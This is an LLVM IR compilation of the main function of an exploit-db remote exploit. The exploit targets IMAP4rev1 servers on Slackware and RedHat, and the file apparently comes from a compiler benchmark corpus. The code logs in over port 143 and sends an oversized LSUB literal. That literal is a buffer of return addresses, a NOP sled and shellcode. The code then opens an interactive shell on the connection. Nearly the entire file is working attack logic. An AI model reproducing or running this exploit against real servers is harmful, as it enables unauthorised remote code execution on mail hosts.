; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_284.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_284.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8, i32, i32, i32 }
%struct.hostent = type { i8*, i32 }
%struct.sockaddr = type { i32 }

@SIZE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [110 x i8] c"\0ARemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\0ADeveloped by SkyLaZarT - www.BufferOverflow.org\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"%s <host> <login> <password> <type> [offset]\0A\00", align 1
@.str.2 = private unnamed_addr constant [197 x i8] c"\09type: [0]\09Slackware 7.0 with IMAP4rev1 v12.261\0A\09type: [1]\09Slackware 7.1 with IMAP4rev1 v12.264\0A\09type: [2]\09RedHat 6.2 ZooT with IMAP4rev1 v12.264\0A\09type: [3]\09Slackware 7.0 with IMAP4rev1 2000.284\0A\0A\00", align 1
@RET12261 = common dso_local global i64 0, align 8
@RET12264 = common dso_local global i64 0, align 8
@RET12264ZOOT = common dso_local global i64 0, align 8
@RET2000_284 = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [40 x i8] c"invalid type.. assuming default type 0\0A\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@processSignal = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [25 x i8] c"Trying to exploit %s...\0A\00", align 1
@.str.5 = private unnamed_addr constant [57 x i8] c"Using return address 0x%08lx. Shellcode size: %i bytes\0A\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@TIMEOUT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"Unknow hostname : %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"Connecting... \00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"failed to %s:143\0A\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"OK\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@debug = common dso_local global i64 0, align 8
@.str.11 = private unnamed_addr constant [9 x i8] c"debug %s\00", align 1
@.str.12 = private unnamed_addr constant [22 x i8] c"Trying to loging ... \00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"1 LOGIN %s %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [19 x i8] c"OK LOGIN completed\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"Login failed!!\0A\00", align 1
@.str.16 = private unnamed_addr constant [19 x i8] c"1 LSUB \22\22 {1064}\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [6 x i8] c"Ready\00", align 1
@.str.18 = private unnamed_addr constant [21 x i8] c"LSUB command failed\0A\00", align 1
@.str.19 = private unnamed_addr constant [22 x i8] c"Sending shellcode... \00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [35 x i8] c"PRESS ENTER for exploit status!!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca %struct.hostent*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @SIZE, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %6, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %7, align 8
  %20 = load i32, i32* @stderr, align 4
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 5
  br i1 %23, label %24, label %33

24:                                               ; preds = %2
  %25 = load i32, i32* @stderr, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0), i8* %28)
  %30 = load i32, i32* @stderr, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([197 x i8], [197 x i8]* @.str.2, i64 0, i64 0))
  %32 = call i32 @exit(i32 -1) #4
  unreachable

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  store i8* %36, i8** %9, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 3
  %39 = load i8*, i8** %38, align 8
  store i8* %39, i8** %10, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 4
  %42 = load i8*, i8** %41, align 8
  %43 = call i64 @atoi(i8* %42)
  switch i64 %43, label %52 [
    i64 0, label %44
    i64 1, label %46
    i64 2, label %48
    i64 3, label %50
  ]

44:                                               ; preds = %33
  %45 = load i64, i64* @RET12261, align 8
  store i64 %45, i64* %11, align 8
  br label %56

46:                                               ; preds = %33
  %47 = load i64, i64* @RET12264, align 8
  store i64 %47, i64* %11, align 8
  br label %56

48:                                               ; preds = %33
  %49 = load i64, i64* @RET12264ZOOT, align 8
  store i64 %49, i64* %11, align 8
  br label %56

50:                                               ; preds = %33
  %51 = load i64, i64* @RET2000_284, align 8
  store i64 %51, i64* %11, align 8
  br label %56

52:                                               ; preds = %33
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0))
  %55 = load i64, i64* @RET12261, align 8
  store i64 %55, i64* %11, align 8
  br label %56

56:                                               ; preds = %52, %50, %48, %46, %44
  %57 = load i32, i32* %4, align 4
  %58 = icmp eq i32 %57, 6
  br i1 %58, label %59, label %66

59:                                               ; preds = %56
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 5
  %62 = load i8*, i8** %61, align 8
  %63 = call i64 @atoi(i8* %62)
  %64 = load i64, i64* %11, align 8
  %65 = add nsw i64 %64, %63
  store i64 %65, i64* %11, align 8
  br label %66

66:                                               ; preds = %59, %56
  %67 = load i32, i32* @SIGALRM, align 4
  %68 = load i32, i32* @processSignal, align 4
  %69 = call i32 @signal(i32 %67, i32 %68)
  %70 = load i32, i32* @stderr, align 4
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i8* %73)
  %75 = load i32, i32* @stderr, align 4
  %76 = load i64, i64* %11, align 8
  %77 = load i8*, i8** @shellcode, align 8
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.5, i64 0, i64 0), i64 %76, i32 %78)
  %80 = load i32, i32* @TIMEOUT, align 4
  %81 = call i32 @alarm(i32 %80)
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 1
  %84 = load i8*, i8** %83, align 8
  %85 = call %struct.hostent* @gethostbyname(i8* %84)
  store %struct.hostent* %85, %struct.hostent** %13, align 8
  %86 = load %struct.hostent*, %struct.hostent** %13, align 8
  %87 = icmp ne %struct.hostent* %86, null
  br i1 %87, label %94, label %88

88:                                               ; preds = %66
  %89 = load i32, i32* @stderr, align 4
  %90 = load i32, i32* @errno, align 4
  %91 = call i8* @strerror(i32 %90)
  %92 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %91)
  %93 = call i32 @exit(i32 -1) #4
  unreachable

94:                                               ; preds = %66
  %95 = call i32 @alarm(i32 0)
  %96 = load i32, i32* @AF_INET, align 4
  %97 = load i32, i32* @SOCK_STREAM, align 4
  %98 = call i32 @socket(i32 %96, i32 %97, i32 0)
  store i32 %98, i32* %14, align 4
  %99 = load i32, i32* %14, align 4
  %100 = icmp slt i32 %99, 0
  br i1 %100, label %101, label %104

101:                                              ; preds = %94
  %102 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %103 = call i32 @exit(i32 -1) #4
  unreachable

104:                                              ; preds = %94
  %105 = load i32, i32* @AF_INET, align 4
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 3
  store i32 %105, i32* %106, align 4
  %107 = call i32 @htons(i32 143)
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %107, i32* %108, align 4
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %110 = load %struct.hostent*, %struct.hostent** %13, align 8
  %111 = getelementptr inbounds %struct.hostent, %struct.hostent* %110, i32 0, i32 0
  %112 = load i8*, i8** %111, align 8
  %113 = load %struct.hostent*, %struct.hostent** %13, align 8
  %114 = getelementptr inbounds %struct.hostent, %struct.hostent* %113, i32 0, i32 1
  %115 = load i32, i32* %114, align 8
  %116 = call i32 @memcpy(i8* %109, i8* %112, i32 %115)
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %118 = call i32 @bzero(i32* %117, i32 8)
  %119 = load i32, i32* @stderr, align 4
  %120 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0))
  %121 = load i32, i32* @TIMEOUT, align 4
  %122 = call i32 @alarm(i32 %121)
  %123 = load i32, i32* %14, align 4
  %124 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %125 = call i64 @connect(i32 %123, %struct.sockaddr* %124, i32 16)
  %126 = icmp slt i64 %125, 0
  br i1 %126, label %127, label %134

127:                                              ; preds = %104
  %128 = load i32, i32* @stderr, align 4
  %129 = load i8**, i8*** %5, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 (i32, i8*, ...) @fprintf(i32 %128, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0), i8* %131)
  %133 = call i32 @exit(i32 -1) #4
  unreachable

134:                                              ; preds = %104
  %135 = call i32 @alarm(i32 0)
  %136 = load i32, i32* @stderr, align 4
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %136, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  br label %138

138:                                              ; preds = %148, %134
  %139 = load i32, i32* %15, align 4
  %140 = load i32, i32* @SIZE, align 4
  %141 = icmp sle i32 %139, %140
  br i1 %141, label %142, label %151

142:                                              ; preds = %138
  %143 = load i64, i64* %11, align 8
  %144 = load i32, i32* %15, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %19, i64 %145
  %147 = bitcast i8* %146 to i64*
  store i64 %143, i64* %147, align 1
  br label %148

148:                                              ; preds = %142
  %149 = load i32, i32* %15, align 4
  %150 = add nsw i32 %149, 4
  store i32 %150, i32* %15, align 4
  br label %138

151:                                              ; preds = %138
  store i32 0, i32* %15, align 4
  br label %152

152:                                              ; preds = %165, %151
  %153 = load i32, i32* %15, align 4
  %154 = load i32, i32* @SIZE, align 4
  %155 = load i8*, i8** @shellcode, align 8
  %156 = call i32 @strlen(i8* %155)
  %157 = sub nsw i32 %154, %156
  %158 = sub nsw i32 %157, 100
  %159 = icmp slt i32 %153, %158
  br i1 %159, label %160, label %168

160:                                              ; preds = %152
  %161 = load i8, i8* @NOP, align 1
  %162 = load i32, i32* %15, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8, i8* %19, i64 %163
  store i8 %161, i8* %164, align 1
  br label %165

165:                                              ; preds = %160
  %166 = load i32, i32* %15, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %15, align 4
  br label %152

168:                                              ; preds = %152
  %169 = load i32, i32* %15, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %19, i64 %170
  %172 = load i8*, i8** @shellcode, align 8
  %173 = load i8*, i8** @shellcode, align 8
  %174 = call i32 @strlen(i8* %173)
  %175 = call i32 @memcpy(i8* %171, i8* %172, i32 %174)
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %177 = call i32 @INIT(i8* %176)
  %178 = load i32, i32* %14, align 4
  %179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %180 = call i32 @READ(i32 %178, i8* %179)
  %181 = load i64, i64* @debug, align 8
  %182 = icmp ne i64 %181, 0
  br i1 %182, label %183, label %187

183:                                              ; preds = %168
  %184 = load i32, i32* @stderr, align 4
  %185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %186 = call i32 (i32, i8*, ...) @fprintf(i32 %184, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i8* %185)
  br label %187

187:                                              ; preds = %183, %168
  %188 = load i32, i32* @stderr, align 4
  %189 = call i32 (i32, i8*, ...) @fprintf(i32 %188, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.12, i64 0, i64 0))
  %190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %191 = load i8*, i8** %9, align 8
  %192 = load i8*, i8** %10, align 8
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %191, i8* %192)
  %194 = load i32, i32* %14, align 4
  %195 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %196 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %197 = call i32 @strlen(i8* %196)
  %198 = call i32 @write(i32 %194, i8* %195, i32 %197)
  %199 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %200 = call i32 @INIT(i8* %199)
  %201 = load i32, i32* %14, align 4
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %203 = call i32 @READ(i32 %201, i8* %202)
  %204 = load i64, i64* @debug, align 8
  %205 = icmp ne i64 %204, 0
  br i1 %205, label %206, label %210

206:                                              ; preds = %187
  %207 = load i32, i32* @stderr, align 4
  %208 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %209 = call i32 (i32, i8*, ...) @fprintf(i32 %207, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i8* %208)
  br label %210

210:                                              ; preds = %206, %187
  %211 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %212 = call i32 @strstr(i8* %211, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.14, i64 0, i64 0))
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %220, label %214

214:                                              ; preds = %210
  %215 = load i32, i32* @stderr, align 4
  %216 = call i32 (i32, i8*, ...) @fprintf(i32 %215, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0))
  %217 = load i32, i32* %14, align 4
  %218 = call i32 @close(i32 %217)
  %219 = call i32 @exit(i32 -1) #4
  unreachable

220:                                              ; preds = %210
  %221 = load i32, i32* @stderr, align 4
  %222 = call i32 (i32, i8*, ...) @fprintf(i32 %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %224 = call i32 @INIT(i8* %223)
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %226 = call i32 (i8*, i8*, ...) @sprintf(i8* %225, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.16, i64 0, i64 0))
  %227 = load i32, i32* %14, align 4
  %228 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %230 = call i32 @strlen(i8* %229)
  %231 = call i32 @write(i32 %227, i8* %228, i32 %230)
  %232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %233 = call i32 @INIT(i8* %232)
  %234 = load i32, i32* %14, align 4
  %235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %236 = call i32 @READ(i32 %234, i8* %235)
  %237 = load i64, i64* @debug, align 8
  %238 = icmp ne i64 %237, 0
  br i1 %238, label %239, label %243

239:                                              ; preds = %220
  %240 = load i32, i32* @stderr, align 4
  %241 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %242 = call i32 (i32, i8*, ...) @fprintf(i32 %240, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i8* %241)
  br label %243

243:                                              ; preds = %239, %220
  %244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %245 = call i32 @strstr(i8* %244, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.17, i64 0, i64 0))
  %246 = icmp ne i32 %245, 0
  br i1 %246, label %253, label %247

247:                                              ; preds = %243
  %248 = load i32, i32* @stderr, align 4
  %249 = call i32 (i32, i8*, ...) @fprintf(i32 %248, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.18, i64 0, i64 0))
  %250 = load i32, i32* %14, align 4
  %251 = call i32 @close(i32 %250)
  %252 = call i32 @exit(i32 -1) #4
  unreachable

253:                                              ; preds = %243
  %254 = load i32, i32* @stderr, align 4
  %255 = call i32 (i32, i8*, ...) @fprintf(i32 %254, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.19, i64 0, i64 0))
  %256 = load i32, i32* %14, align 4
  %257 = call i32 @write(i32 %256, i8* %19, i32 1064)
  %258 = load i32, i32* %14, align 4
  %259 = call i32 @write(i32 %258, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i64 0, i64 0), i32 2)
  %260 = load i32, i32* @stderr, align 4
  %261 = call i32 (i32, i8*, ...) @fprintf(i32 %260, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %262 = load i32, i32* @stderr, align 4
  %263 = call i32 (i32, i8*, ...) @fprintf(i32 %262, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.21, i64 0, i64 0))
  %264 = load i32, i32* %14, align 4
  %265 = call i32 @openshell(i32 %264, i32 1)
  %266 = load i32, i32* %14, align 4
  %267 = call i32 @close(i32 %266)
  store i32 0, i32* %3, align 4
  %268 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %268)
  %269 = load i32, i32* %3, align 4
  ret i32 %269
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @signal(i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @alarm(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i8* @strerror(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @bzero(i32*, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @INIT(i8*) #2

declare dso_local i32 @READ(i32, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strstr(i8*, i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @openshell(i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
